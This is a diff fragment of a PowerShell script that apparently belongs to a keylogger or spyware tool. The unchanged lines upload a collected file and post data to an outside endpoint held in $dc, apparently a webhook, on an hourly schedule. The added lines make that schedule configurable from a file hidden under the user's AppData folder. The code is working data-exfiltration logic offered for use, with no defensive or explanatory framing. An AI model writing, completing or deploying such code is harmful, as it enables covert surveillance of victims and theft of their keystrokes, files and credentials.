@@ -28,6 +28,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body (
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $dc}
 }
 
+if([String]::IsNullOrWhiteSpace((Get-content "$env:appdata\-locker\log.txt"))){
 # times logs will be sent [keep in military time]
 $logTimes = @(
     '00:00:00',
@@ -55,6 +56,12 @@ $logTimes = @(
     '22:00:00',
     '23:00:00'
 )
+}
+
+else {$logTimes = @(
+    (Get-content "$env:appdata\-locker\log.txt")
+)
+}    
 
 # sort the times in chronological order
 $logTimes = $logTimes | Sort-Object
